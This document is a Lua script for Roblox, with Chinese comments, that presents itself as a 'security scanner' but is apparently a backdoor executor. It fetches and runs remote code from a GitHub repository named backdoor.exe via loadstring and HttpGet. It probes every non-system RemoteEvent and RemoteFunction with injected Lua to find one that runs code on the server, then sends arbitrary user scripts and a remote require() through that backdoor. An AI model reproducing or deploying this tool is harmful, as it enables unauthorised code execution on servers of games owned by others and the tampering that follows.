-- 优化版安全扫描工具 - 增强兼容性和检测能力
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local JointsService = game:GetService("JointsService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")
local ServerStorage = game:GetService("ServerStorage")
local StarterPlayer = game:GetService("StarterPlayer")
local StarterGui = game:GetService("StarterGui")
local TextService = game:GetService("TextService")

-- 变量
local LocalPlayer = Players.LocalPlayer
local RobloxGui = CoreGui:FindFirstChild("RobloxGui")

-- 函数缓存
local tableFind = table.find
local taskSpawn = task.spawn or spawn
local taskWait = task.wait or wait
local mathRandom = math.random
local stringFormat = string.format

-- 全局状态
local attached = false
local backdoor = nil
local scanInProgress = false

-- 扩展扫描位置
local scanLocations = {
    ReplicatedStorage,
    Workspace,
    Lighting,
    ServerScriptService,
    ServerStorage,
    StarterPlayer,
    StarterGui,
    CoreGui,
    Players
}

-- 远程对象过滤
local excludeLocations = {
    [JointsService] = true,
    [RobloxReplicatedStorage] = true
}

-- 常量
local INV_CODE = "xJHCqm84cW"
local STRING_VALUE_NAME = tostring(mathRandom(1000000, 9999999))

-- 清理之前的实例
if RobloxGui and RobloxGui:FindFirstChild("V6") then
    RobloxGui.V6:Destroy()
end

-- 安全加载UI
local Variables
local success, err = pcall(function()
    Variables = loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/ui.lua"))()
end)

if not success then
    -- 备用UI方案
    warn("UI加载失败，使用基础界面: " .. tostring(err))
    Variables = {
        UI = {
            Main = {
                Active = true,
                Draggable = true,
                Position = UDim2.new(0.3, 0, 0.3, 0)
            },
            Destroy = function() end
        },
        Topbar = {
            Status = {Text = "Ready"},
            CloseButton = {MouseButton1Click = {Connect = function() end}},
            R6Button = {MouseButton1Click = {Connect = function() end}},
            Status = {
                Text = "Ready",
                Circle = {
                    Status_Color = {
                        BackgroundColor3 = Color3.fromRGB(255, 255, 0)
                    }
                }
            }
        },
        MainButtons = {
            ScanButton = {MouseButton1Click = {Connect = function() end}},
            ExecuteButton = {MouseButton1Click = {Connect = function() end}},
            ClearButton = {MouseButton1Click = {Connect = function() end}},
            HideButton = {MouseButton1Click = {Connect = function() end}},
            InviteButton = {MouseButton1Click = {Connect = function() end}}
        },
        SourceFrame = {
            Source = {
                Text = "",
                Visible = true
            }
        }
    }
end

-- 确保UI可拖动
if Variables and Variables.UI and Variables.UI.Main then
    Variables.UI.Main.Active = true
    Variables.UI.Main.Draggable = true
end

-- 通知函数
local function notify(text, callback, button1, button2)
    local success, result = pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = "Security Scanner",
            Duration = 3,
            Text = text,
            Callback = callback,
            Button1 = button1,
            Button2 = button2
        })
    end)
    
    if not success then
        warn("通知发送失败: " .. tostring(result))
    end
end

-- 改进的远程对象验证
local function validRemote(remote)
    if not remote or not remote.Parent then 
        return false 
    end
    
    local remoteClass = remote.ClassName
    if remoteClass ~= "RemoteEvent" and remoteClass ~= "RemoteFunction" then
        return false
    end
    
    -- 排除系统远程对象
    local parent = remote.Parent
    if excludeLocations[parent] then
        return false
    end
    
    if remote:IsDescendantOf(RobloxReplicatedStorage) then
        return false
    end
    
    -- 排除特定模式的远程对象
    local remoteName = remote.Name:lower()
    local suspiciousNames = {
        "admin", "kick", "ban", "crash", "execute", 
        "script", "backdoor", "hack", "exploit"
    }
    
    for _, name in ipairs(suspiciousNames) do
        if remoteName:find(name) then
            return true -- 这些可能是漏洞点，需要扫描
        end
    end
    
    -- 默认扫描所有非系统远程对象
    return true
end

-- 改进的扫描函数
local function scanLocation(location)
    if not location or excludeLocations[location] then 
        return false 
    end
    
    local foundVulnerability = false
    
    -- 扫描所有后代
    local descendants = location:GetDescendants()
    for _, descendant in ipairs(descendants) do
        if not scanInProgress then break end
        
        if validRemote(descendant) then
            -- 尝试多种检测方法
            local testMethods = {
                function(remote)
                    local testCode = stringFormat(
                        "if workspace:FindFirstChild('%s') then workspace['%s']:Destroy() end",
                        STRING_VALUE_NAME, STRING_VALUE_NAME
                    )
                    
                    if remote.ClassName == "RemoteEvent" then
                        remote:FireServer(testCode)
                    else
                        pcall(function() remote:InvokeServer(testCode) end)
                    end
                    return workspace:FindFirstChild(STRING_VALUE_NAME) == nil
                end,
                
                function(remote)
                    local remoteCode = tostring(mathRandom(100000, 999999))
                    local testScript = stringFormat(
                        "local s=Instance.new('StringValue',workspace)s.Name='%s's.Value='%s'",
                        STRING_VALUE_NAME, remoteCode
                    )
                    
                    if remote.ClassName == "RemoteEvent" then
                        remote:FireServer(testScript)
                    else
                        pcall(function() remote:InvokeServer(testScript) end)
                    end
                    
                    local foundObj = workspace:FindFirstChild(STRING_VALUE_NAME)
                    if foundObj and foundObj.Value == remoteCode then
                        foundObj:Destroy()
                        return true
                    end
                    return false
                end
            }
            
            for _, testMethod in ipairs(testMethods) do
                local success, result = pcall(testMethod, descendant)
                if success and result then
                    attached = true
                    backdoor = descendant
                    foundVulnerability = true
                    notify("发现安全漏洞: " .. descendant:GetFullName())
                    break
                end
            end
            
            if foundVulnerability then
                break
            end
        end
    end
    
    return foundVulnerability
end

-- 主扫描函数
local function scanGame()
    if scanInProgress then
        notify("扫描正在进行中...")
        return false
    end
    
    scanInProgress = true
    attached = false
    backdoor = nil
    
    notify("开始安全扫描...")
    
    -- 更新UI状态
    if Variables.Topbar and Variables.Topbar.Status then
        Variables.Topbar.Status.Text = "扫描中"
        if Variables.Topbar.Status.Circle and Variables.Topbar.Status.Circle.Status_Color then
            Variables.Topbar.Status.Circle.Status_Color.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
        end
    end
    
    local found = false
    
    -- 扫描所有配置的位置
    for _, location in ipairs(scanLocations) do
        if not scanInProgress then break end
        if scanLocation(location) then
            found = true
            break
        end
    end
    
    -- 扫描游戏的其他部分
    if not found then
        for _, child in ipairs(game:GetChildren()) do
            if not scanInProgress then break end
            if not tableFind(scanLocations, child) and not excludeLocations[child] then
                if scanLocation(child) then
                    found = true
                    break
                end
            end
        end
    end
    
    scanInProgress = false
    
    -- 更新结果
    if found then
        notify("发现安全漏洞!")
        if Variables.Topbar and Variables.Topbar.Status then
            Variables.Topbar.Status.Text = "发现漏洞"
            if Variables.Topbar.Status.Circle and Variables.Topbar.Status.Circle.Status_Color then
                Variables.Topbar.Status.Circle.Status_Color.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            end
        end
    else
        notify("未发现安全漏洞")
        if Variables.Topbar and Variables.Topbar.Status then
            Variables.Topbar.Status.Text = "安全"
            if Variables.Topbar.Status.Circle and Variables.Topbar.Status.Circle.Status_Color then
                Variables.Topbar.Status.Circle.Status_Color.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            end
        end
    end
    
    return found
end

-- 执行脚本函数
local function executeScript(scriptText)
    local scriptToExecute = scriptText or (Variables.SourceFrame and Variables.SourceFrame.Source.Text or "")
    if scriptToExecute == "" then 
        notify("请输入要执行的脚本")
        return 
    end
    
    if not attached or not backdoor then
        local function handleResponse(response)
            if response == "是" then
                if scanGame() then
                    executeScript(scriptToExecute)
                end
            end
        end
        
        local bindable = Instance.new("BindableFunction")
        bindable.OnInvoke = handleResponse
        notify("未连接到服务器。\n是否扫描漏洞?", bindable, "是", "否")
        return
    end
    
    local success, errorMsg = pcall(function()
        if backdoor.ClassName == "RemoteEvent" then
            backdoor:FireServer(scriptToExecute)
        elseif backdoor.ClassName == "RemoteFunction" then
            backdoor:InvokeServer(scriptToExecute)
        end
    end)
    
    if not success then
        notify("执行失败: " .. tostring(errorMsg))
    else
        notify("脚本执行完成")
    end
end

-- Discord邀请函数
local function promptDiscordInvite()
    local httpService = game:GetService("HttpService")
    local requestFunction = (syn and syn.request) or (httpService and httpService.request) or http_request
    
    if not requestFunction then
        setclipboard(INV_CODE)
        notify("邀请码已复制到剪贴板!")
        return
    end
    
    local success, result = pcall(function()
        return requestFunction({
            Url = "http://127.0.0.1:6463/rpc?v=1",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["Origin"] = "https://discord.com"
            },
            Body = httpService:JSONEncode({
                cmd = "INVITE_BROWSER",
                args = {code = INV_CODE},
                nonce = httpService:GenerateGUID(false)
            })
        })
    end)
    
    if not success or (result and result.StatusCode ~= 200) then
        setclipboard(INV_CODE)
        notify("邀请码已复制到剪贴板!")
    else
        notify("已发送Discord邀请! 请查看Discord。")
    end
end

-- 安全连接事件
local function safeConnect(button, callback)
    if button and button.MouseButton1Click then
        local success, conn = pcall(function()
            return button.MouseButton1Click:Connect(callback)
        end)
        if not success then
            warn("按钮连接失败: " .. tostring(button))
        end
        return conn
    end
end

-- 初始化UI事件
safeConnect(Variables.Topbar.CloseButton, function()
    if Variables.UI then
        Variables.UI:Destroy()
    end
end)

safeConnect(Variables.Topbar.R6Button, function()
    executeScript(stringFormat("require(3041175937):r6('%s')", LocalPlayer.Name))
end)

safeConnect(Variables.MainButtons.ScanButton, scanGame)
safeConnect(Variables.MainButtons.ExecuteButton, executeScript)

safeConnect(Variables.MainButtons.ClearButton, function()
    if Variables.SourceFrame and Variables.SourceFrame.Source then
        Variables.SourceFrame.Source.Text = ""
    end
end)

safeConnect(Variables.MainButtons.HideButton, function()
    if Variables.SourceFrame and Variables.SourceFrame.Source then
        Variables.SourceFrame.Source.Visible = not Variables.SourceFrame.Source.Visible
    end
end)

safeConnect(Variables.MainButtons.InviteButton, promptDiscordInvite)

-- 初始化完成
notify("安全扫描工具已加载!\n请负责任地使用此工具。")